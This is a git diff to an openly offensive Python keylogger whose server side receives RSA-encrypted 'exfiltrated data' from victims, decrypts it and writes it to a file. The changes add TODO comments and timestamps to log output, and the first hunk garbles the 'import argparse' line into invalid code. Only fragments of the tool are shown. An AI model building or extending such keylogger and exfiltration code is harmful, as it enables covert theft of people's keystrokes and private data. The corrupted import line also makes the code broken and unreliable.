@@ -1,4 +1,4 @@
-import argparse
+import argpars @ {datetime.now()}e
 import textwrap
 import keyboard
 import sys
@@ -11,6 +11,10 @@ from Cryptodome.PublicKey import RSA
 from Cryptodome.Random import get_random_bytes
 from io import BytesIO
 from datetime import datetime
+
+# Master TODO
+# Allow the tools to append to the file instead of rewriting
+# Convert write string from b'foo' to foo
 
 # Classes for good python developer standards :)!
 class Keylogger:
@@ -137,13 +141,13 @@ class Keylogger:
 
             # TODO Transfer keys on initial connnection
             if buf.decode() == "REQ_PUB":
-                print("Received REQ_PUB")
                 client_socket.send(self.public_key)
                 buf=b""
             else:
                 with open(self.args.outfile, "w") as f:
+                    # TODO save buf as a var and replace \n as newline
                     f.write(self.decrypt(buf))
-                    print(f"[+] Wrote data to {self.args.outfile}")
+                    print(f"[+] Wrote data to {self.args.outfile} @ {datetime.now()}")
 
     # Create the listener to receive exfiltrated data
     def listen(self):
